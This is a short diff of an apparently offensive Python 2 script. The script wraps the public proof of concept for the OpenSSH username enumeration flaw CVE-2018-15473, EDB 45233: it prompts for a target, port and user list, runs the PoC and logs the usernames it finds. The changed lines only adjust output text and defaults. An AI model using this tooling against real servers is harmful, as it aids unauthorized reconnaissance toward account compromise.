@@ -21,10 +21,12 @@ def enum():
   print OKGREEN + '  [+] path 1: openssh enum bug' + ENDC
   print ''
 
-  print OKGREEN + '      preparing...' + ENDC
+  print OKGREEN + '  [+] preparing...\n' + ENDC + BOLD 
 
   grab_or_not = raw_input('      using tool [local/wget]: ')
-  pocpath = '/tmp/45233.py'
+  print '\n' + ENDC
+
+  pocpath = '/tmp/45233.py' # for 'default'
 
   if grab_or_not == 'wget':
     # grab poc from EDB:45233; CVE-2018-15473
@@ -42,15 +44,16 @@ def enum():
       pocpath = '/tmp/45233.py'
 
     elif choice == '2':
+      print BOLD 
       pocpath = raw_input('  type full path to ssh enum poc >> ')
-
+      print ENDC
 
   print BOLD
   target = raw_input('    set target: ')
   port = raw_input('    set port: ')
   threads = 2
   outputFile = 'ssh-enum-bug-'+target+'.log'
-  userlist = raw_input('    (full path to) userlist: ')
+  userlist = raw_input('    (full path to) userlist[/tmp/users.txt]: ')
   print ENDC
 
   runEnumPoc = 'python ' + pocpath + ' --port ' + port
@@ -65,6 +68,7 @@ def enum():
   print '\n' + lines
   readusers.close()
 
+  print '  [+] logfile saved to %s\n' % ( enumusers )
   print '\n' + OKGREEN
   print '  [+] path 1: openssh enum - finished.\n' + ENDC
 
